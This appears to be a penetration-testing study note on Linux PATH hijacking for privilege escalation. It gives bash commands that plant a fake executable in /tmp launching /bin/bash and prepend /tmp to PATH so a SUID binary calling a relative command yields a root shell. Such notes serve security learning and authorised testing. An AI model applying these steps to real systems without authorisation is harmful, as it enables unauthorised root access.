---
tags:
  - Penetration-Testing
  - PrivEsc
---
## What is PATH?
PATH is an environmental variable in Linux/Unix which specifies directories that hold executable programs.
- When user runs any command, searches for executable files using PATH
- Changing PATH variable if binary is not utilizing absolute paths could point to malicious script

## Exploitation
- **Locate SUID/GUID binaries executed with elevated privileges**
- **Examine paths on command calls (are absolute paths being utilized?)**

- **Create imitation of binary in tmp**
```bash
cd /tmp
echo "/bin/bash" > [IMITATION_COMMAND]
chmod +x [IMITATION_COMMAND]
```

- **Change PATH variable to point to where Imitation Command is stored**
```bash
export PATH=/tmp:$PATH
```

- **Execute binary to escalate privileges**

## Resetting PATH variable
```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH
```
